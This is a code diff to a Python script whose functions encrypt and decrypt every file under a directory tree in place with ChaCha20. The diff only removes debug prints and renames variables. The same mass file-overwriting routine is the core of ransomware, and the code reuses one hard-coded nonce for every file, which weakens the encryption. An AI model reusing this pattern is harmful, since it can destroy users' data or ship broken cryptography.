@@ -32,17 +32,15 @@ def fully_encrypt_drive(root: str, key: bytearray):
     for dir, sub_dirs, file_names in os.walk(root):
         for file_name in file_names:
             with open(os.path.join(dir, file_name), mode="r+b") as file:
-                print(file.name)
                 cipher = ChaCha20.new(key=key, nonce=b"aaaaaaaaaaaa")
                 while True:
                     write_offset = file.tell()
                     plain_data = file.read(1048576) # 1MB
                     if not plain_data:
                         break
-                    encrypted_data = cipher.encrypt(plain_data)
-                    print(encrypted_data, write_offset)
+                    cipher_data = cipher.encrypt(plain_data)
                     file.seek(write_offset)
-                    file.write(encrypted_data)
+                    file.write(cipher_data)
 
     
     # add the brand file. it contains a hash of the key
@@ -64,15 +62,13 @@ def fully_decrypt_drive(root: str, key: bytearray):
     for dir, sub_dirs, file_names in os.walk(root):
         for file_name in file_names:
             with open(os.path.join(dir, file_name), mode="r+b") as file:
-                print(file.name)
-                cipher = ChaCha20.new(key=key, nonce=b'aaaaaaaaaaaa')
+                cipher = ChaCha20.new(key=key, nonce=b"aaaaaaaaaaaa")
                 while True:
                     write_offset = file.tell()
-                    encrypted_data = file.read(1048576) # 1MB
-                    if not encrypted_data:
+                    cipher_data = file.read(1048576) # 1MB
+                    if not cipher_data:
                         break
-                    plain_data = cipher.decrypt(encrypted_data)
-                    print(plain_data, write_offset)
+                    plain_data = cipher.decrypt(cipher_data)
                     file.seek(write_offset)                
                     file.write(plain_data)
 
